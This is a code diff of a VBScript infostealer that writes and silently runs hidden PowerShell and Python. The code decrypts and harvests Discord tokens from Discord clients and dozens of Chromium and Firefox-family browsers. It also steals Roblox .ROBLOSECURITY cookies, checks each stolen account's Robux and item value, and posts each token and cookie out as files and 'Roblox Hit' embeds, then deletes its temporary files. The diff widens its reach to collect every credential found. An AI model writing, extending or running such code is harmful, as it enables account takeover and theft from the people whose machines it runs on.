@@ -36,7 +36,7 @@ Sub IP()
 End Sub
 
 Sub GrabDiscord()
-    Dim psf, tf, raw
+    Dim psf, tf
     psf = TmpFile("dc_g.ps1")
     tf  = TmpFile("dc_r.txt")
     If fso.FileExists(psf) Then fso.DeleteFile psf, True
@@ -45,8 +45,9 @@ Sub GrabDiscord()
     Dim f : Set f = fso.CreateTextFile(psf, True, False)
 
     f.WriteLine "Add-Type -AssemblyName System.Security"
-    f.WriteLine "$token = $null"
-    f.WriteLine "$gcmOK = $false"
+    f.WriteLine "$tokens = [System.Collections.Generic.List[string]]::new()"
+    f.WriteLine "$seen   = [System.Collections.Generic.HashSet[string]]::new()"
+    f.WriteLine "$gcmOK  = $false"
     f.WriteLine "try { $null = [System.Security.Cryptography.AesGcm]; $gcmOK = $true } catch {}"
     f.WriteLine ""
     f.WriteLine "function Get-MK($base) {"
@@ -92,6 +93,7 @@ Sub GrabDiscord()
     f.WriteLine "}"
     f.WriteLine ""
     f.WriteLine "function Scan-File($path, $mk) {"
+    f.WriteLine "    $found = [System.Collections.Generic.List[string]]::new()"
     f.WriteLine "    try {"
     f.WriteLine "        $bytes = [System.IO.File]::ReadAllBytes($path)"
     f.WriteLine "        $txt   = [System.Text.Encoding]::GetEncoding(28591).GetString($bytes)"
@@ -100,75 +102,145 @@ Sub GrabDiscord()
     f.WriteLine "            try {"
     f.WriteLine "                $enc = [Convert]::FromBase64String($m.Value.Substring(12))"
     f.WriteLine "                $dec = Dec-GCM $mk $enc"
-    f.WriteLine "                if ((Valid-Token $dec) -and (Check-Token $dec)) { return $dec }"
+    f.WriteLine "                if ((Valid-Token $dec) -and (Check-Token $dec) -and $seen.Add($dec)) { $found.Add($dec) }"
     f.WriteLine "            } catch {}"
     f.WriteLine "        }"
     f.WriteLine "        $rx2 = [regex]'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}'"
     f.WriteLine "        foreach ($m in $rx2.Matches($txt)) {"
-    f.WriteLine "            if ((Valid-Token $m.Value) -and (Check-Token $m.Value)) { return $m.Value }"
+    f.WriteLine "            if ((Valid-Token $m.Value) -and (Check-Token $m.Value) -and $seen.Add($m.Value)) { $found.Add($m.Value) }"
     f.WriteLine "        }"
     f.WriteLine "        $rx3 = [regex]'mfa\.[\w-]{84}'"
-    f.WriteLine "        $m3  = $rx3.Match($txt)"
-    f.WriteLine "        if ($m3.Success -and (Check-Token $m3.Value)) { return $m3.Value }"
+    f.WriteLine "        foreach ($m in $rx3.Matches($txt)) {"
+    f.WriteLine "            if ((Valid-Token $m.Value) -and (Check-Token $m.Value) -and $seen.Add($m.Value)) { $found.Add($m.Value) }"
+    f.WriteLine "        }"
     f.WriteLine "    } catch {}"
-    f.WriteLine "    return $null"
+    f.WriteLine "    return $found"
     f.WriteLine "}"
     f.WriteLine ""
     f.WriteLine "function Scan-Dir($ldb, $mk) {"
-    f.WriteLine "    if (-not (Test-Path $ldb)) { return $null }"
+    f.WriteLine "    if (-not (Test-Path $ldb)) { return }"
     f.WriteLine "    $files = Get-ChildItem $ldb -File -EA SilentlyContinue |"
     f.WriteLine "             Where-Object { $_.Extension -in '.ldb','.log' } |"
     f.WriteLine "             Sort-Object LastWriteTime -Descending"
     f.WriteLine "    foreach ($file in $files) {"
-    f.WriteLine "        $t = Scan-File $file.FullName $mk"
-    f.WriteLine "        if ($t) { return $t }"
+    f.WriteLine "        foreach ($t in (Scan-File $file.FullName $mk)) { $tokens.Add($t) }"
     f.WriteLine "    }"
-    f.WriteLine "    return $null"
     f.WriteLine "}"
     f.WriteLine ""
-    f.WriteLine "foreach ($app in @('discord','discordcanary','discordptb','discorddevelopment')) {"
-    f.WriteLine "    if ($token) { break }"
+    f.WriteLine "$discordApps = @('discord','discordcanary','discordptb','discorddevelopment')"
+    f.WriteLine "foreach ($app in $discordApps) {"
     f.WriteLine "    $base = Join-Path $env:APPDATA $app"
     f.WriteLine "    if (-not (Test-Path $base)) { continue }"
-    f.WriteLine "    $mk   = Get-MK $base"
-    f.WriteLine "    $t    = Scan-Dir (Join-Path $base 'Local Storage\leveldb') $mk"
-    f.WriteLine "    if ($t) { $token = $t }"
+    f.WriteLine "    $mk = Get-MK $base"
+    f.WriteLine "    Scan-Dir (Join-Path $base 'Local Storage\leveldb') $mk"
     f.WriteLine "}"
     f.WriteLine ""
-    f.WriteLine "if (-not $token) {"
-    f.WriteLine "    foreach ($br in @("
-    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'),"
-    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data'),"
-    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser\User Data'),"
-    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera Stable'),"
-    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'Vivaldi\User Data')"
-    f.WriteLine "    )) {"
-    f.WriteLine "        if ($token) { break }"
-    f.WriteLine "        if (-not (Test-Path $br)) { continue }"
-    f.WriteLine "        $mk    = Get-MK $br"
-    f.WriteLine "        $profs = @('Default') + @(Get-ChildItem $br -Directory -Filter 'Profile *' -EA SilentlyContinue | Select-Object -ExpandProperty Name)"
-    f.WriteLine "        foreach ($p in $profs) {"
-    f.WriteLine "            if ($token) { break }"
-    f.WriteLine "            $t = Scan-Dir (Join-Path $br ""$p\Local Storage\leveldb"") $mk"
-    f.WriteLine "            if ($t) { $token = $t }"
+    f.WriteLine "$browsers = @("
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Google\Chrome SxS\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera Stable'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera GX Stable'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Vivaldi\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Yandex\YandexBrowser\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Chromium\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Kometa\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Orbitum\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'CentBrowser\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Iridium\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA '7Star\7Star\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Sputnik\Sputnik\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Epic Privacy Browser\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'uCozMedia\Uran\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'CatalinaGroup\Citrio\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Coowon\Coowon\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'liebao\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Elements Browser\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Torch\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Comodo\Dragon\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Comodo\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'MapleStudio\ChromePlus\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Amigo\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'CocCoc\Browser\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Flock\Browser\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'BlackHawk\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Xpom\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Kinza\User Data'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Maxthon5\Users'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Maxthon\Application\User Data'),"
+    f.WriteLine "    (Join-Path $env:APPDATA      'Opera Software\Opera Stable'),"
+    f.WriteLine "    (Join-Path $env:APPDATA      'Opera Software\Opera GX Stable')"
+    f.WriteLine ")"
+    f.WriteLine ""
+    f.WriteLine "foreach ($br in $browsers) {"
+    f.WriteLine "    if (-not (Test-Path $br)) { continue }"
+    f.WriteLine "    $mk    = Get-MK $br"
+    f.WriteLine "    $profs = @('Default') + @(Get-ChildItem $br -Directory -EA SilentlyContinue | Where-Object { $_.Name -match '^Profile' } | Select-Object -ExpandProperty Name)"
+    f.WriteLine "    foreach ($p in $profs) {"
+    f.WriteLine "        Scan-Dir (Join-Path $br ""$p\Local Storage\leveldb"") $mk"
+    f.WriteLine "    }"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "# Firefox / gecko family"
+    f.WriteLine "$ffRoots = @("
+    f.WriteLine "    (Join-Path $env:APPDATA 'Mozilla\Firefox\Profiles'),"
+    f.WriteLine "    (Join-Path $env:APPDATA 'Waterfox\Profiles'),"
+    f.WriteLine "    (Join-Path $env:APPDATA 'K-Meleon\Profiles'),"
+    f.WriteLine "    (Join-Path $env:APPDATA 'Pale Moon\Profiles'),"
+    f.WriteLine "    (Join-Path $env:APPDATA 'Basilisk\Profiles'),"
+    f.WriteLine "    (Join-Path $env:APPDATA 'NETGATE Technologies\BlackHaw\Profiles'),"
+    f.WriteLine "    (Join-Path $env:APPDATA 'Thunderbird\Profiles')"
+    f.WriteLine ")"
+    f.WriteLine "foreach ($root in $ffRoots) {"
+    f.WriteLine "    if (-not (Test-Path $root)) { continue }"
+    f.WriteLine "    Get-ChildItem $root -Directory -EA SilentlyContinue | ForEach-Object {"
+    f.WriteLine "        $ldb = Join-Path $_.FullName 'storage\default'"
+    f.WriteLine "        if (Test-Path $ldb) {"
+    f.WriteLine "            Get-ChildItem $ldb -Recurse -File -EA SilentlyContinue |"
+    f.WriteLine "            Where-Object { $_.Extension -in '.sqlite','.log','.ldb','' -and $_.Length -lt 5MB } |"
+    f.WriteLine "            ForEach-Object {"
+    f.WriteLine "                foreach ($t in (Scan-File $_.FullName $null)) { $tokens.Add($t) }"
+    f.WriteLine "            }"
+    f.WriteLine "        }"
+    f.WriteLine "        $ls = Join-Path $_.FullName 'local-storage'"
+    f.WriteLine "        if (Test-Path $ls) {"
+    f.WriteLine "            Get-ChildItem $ls -File -EA SilentlyContinue | ForEach-Object {"
+    f.WriteLine "                foreach ($t in (Scan-File $_.FullName $null)) { $tokens.Add($t) }"
+    f.WriteLine "            }"
     f.WriteLine "        }"
     f.WriteLine "    }"
     f.WriteLine "}"
     f.WriteLine ""
-    f.WriteLine "if ($token) { $token | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"
-    f.WriteLine "else { 'NOT_FOUND' | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"
+    f.WriteLine "if ($tokens.Count -gt 0) {"
+    f.WriteLine "    $tokens | Out-File '" & tf & "' -Encoding utf8"
+    f.WriteLine "} else {"
+    f.WriteLine "    'NOT_FOUND' | Out-File '" & tf & "' -Encoding utf8 -NoNewline"
+    f.WriteLine "}"
 
     f.Close : Set f = Nothing
     sh.Run "cmd /c powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
     If fso.FileExists(psf) Then fso.DeleteFile psf, True
     If Not fso.FileExists(tf) Then Exit Sub
-    raw = Trim(ReadFile(tf))
+
+    Dim raw : raw = Trim(ReadFile(tf))
     If fso.FileExists(tf) Then fso.DeleteFile tf, True
-    If raw <> "NOT_FOUND" And Len(raw) > 10 Then PostFile "discord_token.txt", raw
+    If raw = "NOT_FOUND" Or Len(raw) < 10 Then Exit Sub
+
+    Dim lines() : lines = Split(raw, vbLf)
+    Dim idx : idx = 0
+    Dim ln
+    For Each ln In lines
+        ln = Trim(ln)
+        If Len(ln) > 10 Then
+            idx = idx + 1
+            PostFile "discord_token_" & idx & ".txt", ln
+        End If
+    Next
 End Sub
 
 Sub GrabRoblox()
-    Dim psf, tf, raw
+    Dim psf, tf
     psf = TmpFile("rblx_g.ps1")
     tf  = TmpFile("rblx_r.txt")
     If fso.FileExists(psf) Then fso.DeleteFile psf, True
@@ -177,9 +249,11 @@ Sub GrabRoblox()
     Dim f : Set f = fso.CreateTextFile(psf, True, False)
 
     f.WriteLine "Add-Type -AssemblyName System.Security"
-    f.WriteLine "$cookie = $null"
+    f.WriteLine "$cookies = [System.Collections.Generic.List[string]]::new()"
+    f.WriteLine "$seen    = [System.Collections.Generic.HashSet[string]]::new()"
     f.WriteLine ""
     f.WriteLine "function Clean-Cookie($raw) {"
+    f.WriteLine "    if (-not $raw) { return $null }"
     f.WriteLine "    $c = ($raw -replace '[\r\n\t ]','').Split(';')[0]"
     f.WriteLine "    $i = $c.IndexOf('_|WARNING')"
     f.WriteLine "    if ($i -gt 0) { $c = $c.Substring($i) }"
@@ -187,56 +261,81 @@ Sub GrabRoblox()
     f.WriteLine "    return $null"
     f.WriteLine "}"
     f.WriteLine ""
+    f.WriteLine "function Add-Cookie($c) {"
+    f.WriteLine "    $cl = Clean-Cookie $c"
+    f.WriteLine "    if ($cl -and $seen.Add($cl)) { $cookies.Add($cl) }"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "function Get-MK($base) {"
+    f.WriteLine "    try {"
+    f.WriteLine "        $ls = Join-Path $base 'Local State'"
+    f.WriteLine "        if (-not (Test-Path $ls)) { return $null }"
+    f.WriteLine "        $j  = [System.IO.File]::ReadAllText($ls) | ConvertFrom-Json"
+    f.WriteLine "        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)"
+    f.WriteLine "        return [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]$ek[5..($ek.Length-1)], $null, 'CurrentUser')"
+    f.WriteLine "    } catch { return $null }"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "function Dec-GCM($mk, $enc) {"
+    f.WriteLine "    if ($null -eq $mk -or $enc.Length -lt 31) { return $null }"
+    f.WriteLine "    try {"
+    f.WriteLine "        $gcmOK = $false"
+    f.WriteLine "        try { $null = [System.Security.Cryptography.AesGcm]; $gcmOK = $true } catch {}"
+    f.WriteLine "        if (-not $gcmOK) { return $null }"
+    f.WriteLine "        $nonce = [byte[]]$enc[3..14]"
+    f.WriteLine "        $tag   = [byte[]]$enc[($enc.Length-16)..($enc.Length-1)]"
+    f.WriteLine "        $ct    = [byte[]]$enc[15..($enc.Length-17)]"
+    f.WriteLine "        $out   = New-Object byte[] $ct.Length"
+    f.WriteLine "        $gcm   = [System.Security.Cryptography.AesGcm]::new([byte[]]$mk)"
+    f.WriteLine "        $gcm.Decrypt($nonce, $ct, $tag, $out)"
+    f.WriteLine "        $gcm.Dispose()"
+    f.WriteLine "        return [System.Text.Encoding]::UTF8.GetString($out)"
+    f.WriteLine "    } catch { return $null }"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "# --- flat file paths (Roblox client stores) ---"
     f.WriteLine "foreach ($rp in @("
     f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\robloxcookies.dat'),"
     f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\RobloxCookies.dat'),"
-    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Roblox\Cookies'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\Cookies'),"
     f.WriteLine "    (Join-Path $env:APPDATA      'Roblox\LocalStorage\robloxcookies.dat')"
     f.WriteLine ")) {"
-    f.WriteLine "    if ($cookie -or -not (Test-Path $rp)) { continue }"
+    f.WriteLine "    if (-not (Test-Path $rp)) { continue }"
     f.WriteLine "    try {"
     f.WriteLine "        $raw = [System.IO.File]::ReadAllText($rp)"
     f.WriteLine "        try {"
     f.WriteLine "            $j = $raw | ConvertFrom-Json"
     f.WriteLine "            $j.PSObject.Properties | Where-Object { $_.Value -is [string] -and $_.Value.Length -gt 80 } | ForEach-Object {"
-    f.WriteLine "                if ($cookie) { return }"
     f.WriteLine "                try {"
     f.WriteLine "                    $ek  = [Convert]::FromBase64String($_.Value)"
     f.WriteLine "                    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($ek, $null, 'CurrentUser')"
-    f.WriteLine "                    $str = [System.Text.Encoding]::UTF8.GetString($dec)"
-    f.WriteLine "                    $c   = Clean-Cookie $str"
-    f.WriteLine "                    if ($c) { $cookie = $c }"
+    f.WriteLine "                    Add-Cookie ([System.Text.Encoding]::UTF8.GetString($dec))"
     f.WriteLine "                } catch {}"
     f.WriteLine "            }"
     f.WriteLine "        } catch {}"
-    f.WriteLine "        if (-not $cookie) { $cookie = Clean-Cookie $raw }"
+    f.WriteLine "        Add-Cookie $raw"
     f.WriteLine "    } catch {}"
     f.WriteLine "}"
     f.WriteLine ""
-    f.WriteLine "if (-not $cookie) {"
-    f.WriteLine "    $pkgs = Join-Path $env:LOCALAPPDATA 'Packages'"
-    f.WriteLine "    if (Test-Path $pkgs) {"
-    f.WriteLine "        Get-ChildItem $pkgs -Directory -EA SilentlyContinue | Where-Object { $_.Name -match 'ROBLOX' } | ForEach-Object {"
-    f.WriteLine "            if ($cookie) { return }"
-    f.WriteLine "            foreach ($fn in @('LocalState\RobloxCookies.dat','LocalState\robloxcookies.dat','LocalState\Cookies')) {"
-    f.WriteLine "                $uwp = Join-Path $_.FullName $fn"
-    f.WriteLine "                if (-not (Test-Path $uwp)) { continue }"
-    f.WriteLine "                try {"
-    f.WriteLine "                    $c = Clean-Cookie ([System.IO.File]::ReadAllText($uwp))"
-    f.WriteLine "                    if ($c) { $cookie = $c; break }"
-    f.WriteLine "                } catch {}"
-    f.WriteLine "            }"
+    f.WriteLine "# --- UWP Roblox ---"
+    f.WriteLine "$pkgs = Join-Path $env:LOCALAPPDATA 'Packages'"
+    f.WriteLine "if (Test-Path $pkgs) {"
+    f.WriteLine "    Get-ChildItem $pkgs -Directory -EA SilentlyContinue | Where-Object { $_.Name -match 'ROBLOX' } | ForEach-Object {"
+    f.WriteLine "        foreach ($fn in @('LocalState\RobloxCookies.dat','LocalState\robloxcookies.dat','LocalState\Cookies')) {"
+    f.WriteLine "            $uwp = Join-Path $_.FullName $fn"
+    f.WriteLine "            if (-not (Test-Path $uwp)) { continue }"
+    f.WriteLine "            try { Add-Cookie ([System.IO.File]::ReadAllText($uwp)) } catch {}"
     f.WriteLine "        }"
     f.WriteLine "    }"
     f.WriteLine "}"
     f.WriteLine ""
-    f.WriteLine "if (-not $cookie) {"
-    f.WriteLine "    $py = (Get-Command python -EA SilentlyContinue)"
-    f.WriteLine "    if (-not $py) { $py = (Get-Command python3 -EA SilentlyContinue) }"
-    f.WriteLine "    if ($py) {"
-    f.WriteLine "        $pyPath = Join-Path $env:TEMP 'rblx_ck.py'"
-    f.WriteLine "        $pyScript = @'"
-    f.WriteLine "import sqlite3,os,shutil,ctypes,base64,json"
+    f.WriteLine "# --- Chromium browsers (SQLite cookie DBs) via Python ---"
+    f.WriteLine "$py = (Get-Command python -EA SilentlyContinue)"
+    f.WriteLine "if (-not $py) { $py = (Get-Command python3 -EA SilentlyContinue) }"
+    f.WriteLine "if ($py) {"
+    f.WriteLine "    $pyPath = Join-Path $env:TEMP 'rblx_ck.py'"
+    f.WriteLine "    $pyScript = @'"
+    f.WriteLine "import sqlite3,os,shutil,ctypes,base64,json,sys"
     f.WriteLine "class B(ctypes.Structure):"
     f.WriteLine "    _fields_=[('cb',ctypes.c_ulong),('pb',ctypes.POINTER(ctypes.c_char))]"
     f.WriteLine "def dpapi(d):"
@@ -259,63 +358,93 @@ Sub GrabRoblox()
     f.WriteLine "    tmp=path+'.tmp'"
     f.WriteLine "    try:"
     f.WriteLine "        shutil.copy2(path,tmp);cn=sqlite3.connect(tmp)"
-    f.WriteLine "        row=cn.execute(""SELECT value,encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'"").fetchone()"
+    f.WriteLine "        rows=cn.execute(""SELECT value,encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'"").fetchall()"
     f.WriteLine "        cn.close();os.unlink(tmp)"
-    f.WriteLine "        if not row:return None"
-    f.WriteLine "        return row[0] if row[0] else dec_ck(mk,row[1])"
+    f.WriteLine "        out=[]"
+    f.WriteLine "        for row in rows:"
+    f.WriteLine "            v=row[0] if row[0] else dec_ck(mk,row[1])"
+    f.WriteLine "            if v:out.append(v)"
+    f.WriteLine "        return out"
     f.WriteLine "    except:"
     f.WriteLine "        try:os.unlink(tmp)"
     f.WriteLine "        except:pass"
-    f.WriteLine "    return None"
-    f.WriteLine "cookie=None;LA=os.path.expandvars('%LOCALAPPDATA%')"
-    f.WriteLine "for br in[os.path.join(LA,'Google','Chrome','User Data'),os.path.join(LA,'Microsoft','Edge','User Data'),os.path.join(LA,'BraveSoftware','Brave-Browser','User Data')]:"
-    f.WriteLine "    if cookie:break"
+    f.WriteLine "    return []"
+    f.WriteLine "seen=set();results=[]"
+    f.WriteLine "LA=os.path.expandvars('%LOCALAPPDATA%')"
+    f.WriteLine "browsers=["
+    f.WriteLine "    os.path.join(LA,'Google','Chrome','User Data'),"
+    f.WriteLine "    os.path.join(LA,'Google','Chrome SxS','User Data'),"
+    f.WriteLine "    os.path.join(LA,'Microsoft','Edge','User Data'),"
+    f.WriteLine "    os.path.join(LA,'BraveSoftware','Brave-Browser','User Data'),"
+    f.WriteLine "    os.path.join(LA,'Opera Software','Opera Stable'),"
+    f.WriteLine "    os.path.join(LA,'Opera Software','Opera GX Stable'),"
+    f.WriteLine "    os.path.join(LA,'Vivaldi','User Data'),"
+    f.WriteLine "    os.path.join(LA,'Yandex','YandexBrowser','User Data'),"
+    f.WriteLine "    os.path.join(LA,'Chromium','User Data'),"
+    f.WriteLine "    os.path.join(LA,'Torch','User Data'),"
+    f.WriteLine "    os.path.join(LA,'Comodo','Dragon','User Data'),"
+    f.WriteLine "    os.path.join(LA,'CocCoc','Browser','User Data'),"
+    f.WriteLine "    os.path.join(LA,'Epic Privacy Browser','User Data'),"
+    f.WriteLine "    os.path.join(LA,'Amigo','User Data'),"
+    f.WriteLine "    os.path.join(LA,'Kinza','User Data'),"
+    f.WriteLine "    os.path.join(LA,'Maxthon','Application','User Data'),"
+    f.WriteLine "    os.path.join(LA,'Roblox','EBWebView','EBWebView')"
+    f.WriteLine "]"
+    f.WriteLine "for br in browsers:"
     f.WriteLine "    if not os.path.exists(br):continue"
     f.WriteLine "    mk=get_mk(br)"
     f.WriteLine "    try:profs=['Default']+[d for d in os.listdir(br) if d.startswith('Profile ')]"
     f.WriteLine "    except:profs=['Default']"
     f.WriteLine "    for prof in profs:"
-    f.WriteLine "        if cookie:break"
     f.WriteLine "        for ckn in['Cookies',os.path.join('Network','Cookies')]:"
     f.WriteLine "            ck=os.path.join(br,prof,ckn)"
     f.WriteLine "            if not os.path.exists(ck):continue"
-    f.WriteLine "            cookie=query_db(ck,mk)"
-    f.WriteLine "            if cookie:break"
-    f.WriteLine "for ck in[os.path.join(LA,'Roblox','EBWebView','EBWebView','Default','Network','Cookies'),os.path.join(LA,'Roblox','EBWebView','EBWebView','Default','Cookies')]:"
-    f.WriteLine "    if cookie:break"
-    f.WriteLine "    if not os.path.exists(ck):continue"
-    f.WriteLine "    cookie=query_db(ck,None)"
-    f.WriteLine "print(cookie if cookie else 'NOT_FOUND')"
+    f.WriteLine "            for v in query_db(ck,mk):"
+    f.WriteLine "                if v not in seen:seen.add(v);results.append(v)"
+    f.WriteLine "print('|||'.join(results) if results else 'NOT_FOUND')"
     f.WriteLine "'@"
-    f.WriteLine "        [System.IO.File]::WriteAllText($pyPath,$pyScript,[System.Text.Encoding]::UTF8)"
-    f.WriteLine "        $pyCk=(& $py.Source $pyPath 2>`$null | Out-String).Trim()"
-    f.WriteLine "        Remove-Item $pyPath -EA SilentlyContinue"
-    f.WriteLine "        if ($pyCk -and $pyCk -ne 'NOT_FOUND') { $cookie = $pyCk }"
+    f.WriteLine "    [System.IO.File]::WriteAllText($pyPath,$pyScript,[System.Text.Encoding]::UTF8)"
+    f.WriteLine "    $pyCks = (& $py.Source $pyPath 2>`$null | Out-String).Trim()"
+    f.WriteLine "    Remove-Item $pyPath -EA SilentlyContinue"
+    f.WriteLine "    if ($pyCks -and $pyCks -ne 'NOT_FOUND') {"
+    f.WriteLine "        foreach ($c in $pyCks.Split('|||')) { Add-Cookie $c }"
     f.WriteLine "    }"
     f.WriteLine "}"
     f.WriteLine ""
-    f.WriteLine "if ($cookie) { $cookie | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"
-    f.WriteLine "else { 'NOT_FOUND' | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"
+    f.WriteLine "if ($cookies.Count -gt 0) {"
+    f.WriteLine "    $cookies | Out-File '" & tf & "' -Encoding utf8"
+    f.WriteLine "} else {"
+    f.WriteLine "    'NOT_FOUND' | Out-File '" & tf & "' -Encoding utf8 -NoNewline"
+    f.WriteLine "}"
 
     f.Close : Set f = Nothing
     sh.Run "cmd /c powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
     If fso.FileExists(psf) Then fso.DeleteFile psf, True
     If Not fso.FileExists(tf) Then Exit Sub
-    raw = Trim(ReadFile(tf))
+
+    Dim raw : raw = Trim(ReadFile(tf))
     If fso.FileExists(tf) Then fso.DeleteFile tf, True
-    If raw <> "NOT_FOUND" And Len(raw) > 10 Then
-        PostFile "roblox_cookie.txt", raw
-        GrabRobloxInfo raw
-    End If
+    If raw = "NOT_FOUND" Or Len(raw) < 10 Then Exit Sub
+
+    Dim lines() : lines = Split(raw, vbLf)
+    Dim idx : idx = 0
+    Dim ln
+    For Each ln In lines
+        ln = Trim(ln)
+        If Len(ln) > 10 Then
+            idx = idx + 1
+            PostFile "roblox_cookie_" & idx & ".txt", ln
+            GrabRobloxInfo ln, idx
+        End If
+    Next
 End Sub
 
-Sub GrabRobloxInfo(cookie)
+Sub GrabRobloxInfo(cookie, idx)
     Dim xh, json, uinfo, uid, uname, robux, premium, created, ageDays, rapVal, createdDate
 
     Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
 
-    ' --- userinfo (uid, username, robux, premium) ---
     xh.Open "GET", "https://www.roblox.com/mobileapi/userinfo", False
     xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
     xh.Send
@@ -330,7 +459,6 @@ Sub GrabRobloxInfo(cookie)
     If robux   = "" Then robux   = "0"
     If premium = "" Then premium = "false"
 
-    ' --- account created date / age ---
     xh.Open "GET", "https://users.roblox.com/v1/users/" & uid, False
     xh.Send
     ageDays = "?"
@@ -345,7 +473,6 @@ Sub GrabRobloxInfo(cookie)
         End If
     End If
 
-    ' --- RAP: sum recentAveragePrice from collectibles ---
     rapVal = "0"
     xh.Open "GET", "https://inventory.roblox.com/v1/users/" & uid & "/assets/collectibles?limit=100", False
     xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
@@ -378,21 +505,18 @@ Sub GrabRobloxInfo(cookie)
 
     Set xh = Nothing
 
-    ' --- build embed matching checker layout ---
     Dim nl : nl = Chr(10)
-    Dim embedDesc : embedDesc = ""
-
-    embedDesc = embedDesc & "**Username** | **Age** | **PC**" & nl
+    Dim embedDesc
+    embedDesc = "**Username** | **Age** | **PC**" & nl
     embedDesc = embedDesc & uname & " | " & ageDays & " Days | " & PC & nl & nl
     embedDesc = embedDesc & "**Robux** | **Premium** | **RAP**" & nl
     embedDesc = embedDesc & robux & " | " & premium & " | " & rapVal & nl & nl
     embedDesc = embedDesc & "**Cookie**" & nl
-    embedDesc = embedDesc & "``Check attached file``"
+    embedDesc = embedDesc & "``Check attached file roblox_cookie_" & idx & ".txt``"
 
-    PostEmbed "Roblox Hit", embedDesc, 16711680
+    PostEmbed "Roblox Hit #" & idx, embedDesc, 16711680
 End Sub
 
-' --- regex helpers (VBScript native, no external deps) ---
 Function RegexFirst(src, pattern)
     Dim rx : Set rx = CreateObject("VBScript.RegExp")
     rx.Pattern = pattern
